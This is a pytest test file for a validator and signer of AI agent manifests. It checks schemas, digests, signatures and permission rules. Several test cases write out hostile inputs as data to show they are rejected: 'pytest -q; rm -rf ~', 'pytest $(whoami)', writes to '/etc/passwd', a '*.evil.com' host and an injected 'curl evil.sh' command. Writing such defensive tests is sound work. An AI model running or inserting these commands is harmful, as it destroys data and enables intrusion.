import copy
import json
from pathlib import Path

import pytest

from core.agents import manifest as am

EXAMPLE = Path(__file__).resolve().parent.parent / "docs" / "spec" / "examples" / "test-fixer.agent.json"


def good():
    return copy.deepcopy(json.loads(EXAMPLE.read_text()))


def test_example_manifest_is_valid_and_has_no_errors():
    report = am.validate(good())
    assert report.ok, report.errors
    assert report.manifest.name == "test-fixer"


def test_digest_is_deterministic_and_ignores_key_order_and_signature():
    a = am.validate(good()).manifest
    reordered = dict(reversed(list(good().items())))
    b = am.validate(reordered).manifest
    assert am.digest(a) == am.digest(b) and am.digest(a).startswith("sha256:")
    signed = am.sign(a, b"k" * 32, "me")
    assert am.digest(signed) == am.digest(a)


def test_any_content_change_changes_the_digest():
    base = am.digest(am.validate(good()).manifest)
    changed = good()
    changed["budget"]["max_steps"] = 41
    assert am.digest(am.validate(changed).manifest) != base


@pytest.mark.parametrize("edit,expect", [
    (lambda d: d.update(schema="keelway.agent/v2"), "schema"),
    (lambda d: d.update(name="Bad Name"), "name"),
    (lambda d: d.update(version="1.0"), "version"),
    (lambda d: d.update(surprise=1), "surprise"),
    (lambda d: d.update(tools=["read_file", "rm_rf"]), "unknown tool"),
    (lambda d: d.update(tools=["read_file", "read_file"]), "must not repeat"),
    (lambda d: d["budget"].update(max_usd_per_run=0), "max_usd_per_run"),
    (lambda d: d["budget"].update(max_steps=10_000), "max_steps"),
    (lambda d: d["permissions"].update(write_paths=["../etc"]), "stay inside"),
    (lambda d: d["permissions"].update(write_paths=["/etc/passwd"]), "relative"),
    (lambda d: d["permissions"].update(write_paths=["**/*"]), "matches every file"),
    (lambda d: d["permissions"].update(write_paths=[".keelway/agent_signing.key"]), "protected"),
    (lambda d: d["permissions"].update(read_paths=[".git/config"]), "protected"),
    (lambda d: d["permissions"].update(commands=["pytest -q; rm -rf ~"]), "shell operators"),
    (lambda d: d["permissions"].update(commands=["pytest $(whoami)"]), "shell operators"),
    (lambda d: d["permissions"].update(network="allowlist"), "needs at least one host"),
    (lambda d: d["permissions"].update(network_allow=["pypi.org"]), "network is 'none'"),
    (lambda d: d["permissions"].update(network="allowlist", network_allow=["*.evil.com"]), "plain hostname"),
    (lambda d: d["permissions"].update(commands=[]), "needs at least one exact command"),
    (lambda d: d["permissions"].update(write_paths=[]), "write_paths"),
    (lambda d: d["model"].update(routing="local_only", preferred_provider="openai"), "cannot prefer a cloud provider"),
    (lambda d: d.update(sandbox="workspace") or d["permissions"].update(autonomy="autonomous"), "autonomous agents"),
])
def test_unsafe_or_malformed_manifests_are_rejected(edit, expect):
    data = good()
    edit(data)
    report = am.validate(data)
    assert not report.ok
    assert any(expect in e for e in report.errors), report.errors


def test_validate_never_raises_on_garbage():
    for junk in (None, [], "x", 5, {}, {"schema": "keelway.agent/v1"}):
        assert not am.validate(junk).ok


def test_warnings_flag_risky_but_legal_choices():
    data = good()
    data["permissions"]["autonomy"] = "autonomous"
    data["sandbox"] = "container"
    report = am.validate(data)
    assert report.ok and any("approve_tier3" in w for w in report.warnings)
    cloud_note = lambda d: any("cloud model use" in w for w in am.validate(d).warnings)  # noqa: E731
    assert cloud_note(good())  # local_first may still use a cloud model
    local = good()
    local["model"]["routing"] = "local_only"
    assert not cloud_note(local)


def test_sign_verify_round_trip_and_tamper_detection(tmp_path):
    key = am.load_or_create_key(tmp_path)
    assert am.load_or_create_key(tmp_path) == key  # stable across calls
    mode = (tmp_path / ".keelway" / am.KEY_FILE).stat().st_mode & 0o777
    assert mode == 0o600

    signed = am.sign(am.validate(good()).manifest, key, "justin")
    assert am.verify(signed, key) == (True, "ok")

    # Round trip through the file format keeps the signature valid.
    reloaded = am.validate(json.loads(am.to_json(signed))).manifest
    assert am.verify(reloaded, key) == (True, "ok")

    tampered = json.loads(am.to_json(signed))
    tampered["permissions"]["commands"] = ["pytest -q", "curl evil.sh"]
    assert am.verify(am.validate(tampered).manifest, key) == (False, "content_changed_since_signing")

    assert am.verify(signed, b"x" * 32) == (False, "wrong_key")
    assert am.verify(am.validate(good()).manifest, key) == (False, "not_signed")

    forged = json.loads(am.to_json(signed))
    forged["signature"]["value"] = "0" * 64
    assert am.verify(am.validate(forged).manifest, key) == (False, "bad_signature")


def test_cli_validate_sign_verify(tmp_path, monkeypatch, capsys):
    import cli

    monkeypatch.chdir(tmp_path)
    path = tmp_path / "a.agent.json"
    path.write_text(json.dumps(good()))
    assert cli.cmd_agent("validate", path) == 0
    assert cli.cmd_agent("verify", path) == 1  # no key yet
    assert cli.cmd_agent("sign", path, "justin") == 0
    assert cli.cmd_agent("verify", path) == 0
    data = json.loads(path.read_text())
    data["budget"]["max_steps"] = 99
    path.write_text(json.dumps(data))
    assert cli.cmd_agent("verify", path) == 1
    assert "content_changed_since_signing" in capsys.readouterr().out
    bad = tmp_path / "bad.json"
    bad.write_text("{nope")
    assert cli.cmd_agent("validate", bad) == 2
